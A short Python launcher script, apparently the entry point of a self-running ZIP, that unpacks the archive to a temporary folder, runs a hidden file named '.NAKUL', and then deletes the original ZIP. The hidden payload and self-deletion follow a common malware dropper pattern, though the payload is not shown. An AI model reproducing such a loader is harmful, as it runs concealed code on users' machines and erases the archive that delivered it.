import os
import sys
import tempfile
import zipfile
import subprocess

def main():
    zip_path = os.path.abspath(sys.argv[0])
    temp_dir = tempfile.mkdtemp()

    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(temp_dir)

    script_path = os.path.join(temp_dir, '.NAKUL')
    subprocess.run(['python', script_path])

    try:
        os.remove(zip_path)
    except Exception as e:
        print(f"Could not delete the ZIP: {e}")

if __name__ == "__main__":
    main()
